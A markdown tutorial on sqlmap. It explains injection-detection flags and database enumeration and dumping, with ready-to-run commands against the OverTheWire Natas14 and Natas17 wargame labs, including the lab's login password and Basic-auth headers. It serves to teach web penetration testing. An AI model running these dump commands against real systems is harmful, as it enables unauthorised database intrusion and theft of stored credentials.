# sqlmap tutorial

## Common Parameters

* `-r <request file>` - Load HTTP request from a file
* `-u <URL>` - Target URL
* `--data <data>` - Data string to be sent through POST (e.g. "id=1")
* `--method <method>` - Force usage of given HTTP method (e.g. PUT)
* `-H <header_type:header_value>` - Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
* `--force-ssl` - Force usage of SSL/HTTPS
* `--string`, `--not-string`, ``-regexp`, `--code` - [These flags](https://github.com/sqlmapproject/sqlmap/wiki/Usage#page-comparison) can be used to customise the detection phase, i.e. when an SQLi has been successful.
* `-v [level]` - [Verbosity level](https://github.com/sqlmapproject/sqlmap/wiki/Usage#output-verbosity) (Default is 1)
  * 0: Show only Python tracebacks, error and critical messages.
  * 1: Show also information and warning messages.
  * 2: Show also debug messages.
  * 3: Show also payloads injected.
  * 4: Show also HTTP requests.
  * 5: Show also HTTP responses' headers.
  * 6: Show also HTTP responses' page content.
* `--level 1|2|3|4|5` - [Level of test](https://github.com/sqlmapproject/sqlmap/wiki/Usage#level) to perform. This option affects which payload sqlmap tries. All in all, the harder it is to detect a SQL injection, the higher the value must be set. Default is 1.
  * 1: GET and POST parameters are tested
  * 2: HTTP Cookie header values
  * 3: HTTP User-Agent/Referer headers' value is tested
* `--risk 1|2|3` - Specifies the [risk of tests](https://github.com/sqlmapproject/sqlmap/wiki/Usage#risk)to perform.
  * 1: Innocuous for the majority of SQL injection points
  * 2: Adds to the default level the tests for heavy query time-based SQL injections
  * 3: Adds also `OR`-based SQL injection tests
  * Note that in some instances, like a SQL injection in an `UPDATE` statement, injecting an `OR`-based payload can lead to an update of all the entries of the table, which is certainly not what the attacker wants
* `--proxy "http://url:port"` - Uses the given proxy to connect to the target URL
* `--threads <num>` - Number of concurrent HTTP(S) requests that sqlmap is allowed to do.
  * Maximum value: `10`

Most common usage is:<br/>
`sqlmap -r <request-file>.http --risk 3 --level 5 --threads 10 -v 3 --proxy "http://127.0.0.1:8080"`

## Parameters after a vulnerability is found

* `--tables` - [Enumerates (lists) the available tables](https://github.com/sqlmapproject/sqlmap/wiki/Usage#enumerate-databases-tables) in the database
* [Dumping data](https://github.com/sqlmapproject/sqlmap/wiki/Usage#enumerate-database-table-columns) (Enumeration of databases, tables, and columns)
  * `-D <db_name>` - Enumerates (lists) tables of the given database
  * `-T <table_name>` - Enumerates (lists) columns the given table
  * `-C <col_name>` - Enumerates (lists the type of) the given column
  * `--where <WHERE-condition>` - Uses arbitrary `WHERE` condition while enumerating
  * `--dump` - Dump the enumerated elements
  * example: `sqlmap -u "example.com" -D testdb -T users -C name --dump`
  * example: `sqlmap -u "example.com" -D testdb -T users --dump`
* `--threads <num>` - Number of concurrent HTTP(S) requests that sqlmap is allowed to do.
  * Maximum value: `10`

Most common usages are

```bash
# Enumerate tables for a given database 'natas17'
sqlmap -r search-username.http --risk 3 --level 5 --threads 10 --proxy "http://127.0.0.1:8080" -D natas17 --tables

# Dump table 'users' in database 'natas17'
sqlmap -r search-username.http --risk 3 --level 5 --threads 10 --proxy "http://127.0.0.1:8080" -D natas17 -T users --dump

# Dump row in database 'natas17', table 'users' and match the given WHERE condition
sqlmap -r search-username.http --risk 3 --level 5 --threads 10 --proxy "http://127.0.0.1:8080" -D natas17 -T users --where 'username="natas18"' --dump

# Dump column 'password' in database 'natas17', table 'users' and match the given WHERE condition
sqlmap -r search-username.http --risk 3 --level 5 --threads 10 --proxy "http://127.0.0.1:8080" -D natas17 -T users -C password --where 'username="natas18"' --dump
```

## Useful Links

* [Specifying Injection Points](https://github.com/sqlmapproject/sqlmap/wiki/Usage#injection)

## Attacking Forms

As examples bellow, we will use the web penetration exercise Natas14 ([http://natas14.natas.labs.overthewire.org](http://natas14.natas.labs.overthewire.org)) for which the username is `natas14` and password is `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1` in order to access the web page and play a very basic, introductory SQL injection challenge.

### Method1 - [Using a request file (`-r`)](https://github.com/sqlmapproject/sqlmap/wiki/Usage#load-http-request-from-a-file)

With the `-r` option you can provide an HTTP request file as template. If your target is using HTTPS, you should use this in conjunction with switch `--force-ssl` or append `:443` to the end of the Host header value. Example:

```bash
sqlmap -r ./sqlmap-request-file.http --string "Successful login!" -v 2
```

### Method2 - [Using the `--forms` switch](https://github.com/sqlmapproject/sqlmap/wiki/Usage#parse-and-test-forms-input-fields)

Basically, this flag automagically finds the available `<form>` and `<input`> elements within the page and then guides you through the SQL injection attack. According to the documentation:

> Provide sqlmap with `--forms` as well as the page where the form can be found as the target URL (`-u`) and sqlmap will request the target URL for you, parse the forms it has and guide you through to test for SQL injection on those form input fields (parameters) rather than the target URL provided.

Example:

```bash
sqlmap -u http://natas14.natas.labs.overthewire.org/index.php --host="natas14.natas.labs.overthewire.org" -H "Authorization: Basic bmF0YXMxNDpMZzk2TTEwVGRmYVB5VkJrSmRqeW1ibGxRNUw2cWRsMQ==" --method POST --forms --string "Successful login!" -v 2
```

<u>**Limitation</u>:** The parameters `--auth-type` with value `Basic` and `--auth-cred` with value `"natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"`, did **<u>not</u>** work when tested with the `--forms` flag. (i.e. they were not added in the HTTP request)

### Method3 - Purely command-line based

In this method we craft the HTTP request in the command line, setting each value to our needs. Example:

```bash
sqlmap -u "http://natas14.natas.labs.overthewire.org/index.php" --method=POST --host="natas14.natas.labs.overthewire.org" -H "Authorization: Basic bmF0YXMxNDpMZzk2TTEwVGRmYVB5VkJrSmRqeW1ibGxRNUw2cWRsMQ==" --data="username=*&password=*" --string "Successful login!" -v 2
```

<u>**Limitation</u>:** The parameters `--auth-type` with value `Basic` and `--auth-cred` with value `"natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"`, did **<u>not</u>** work. (i.e. they were not added in the HTTP request)
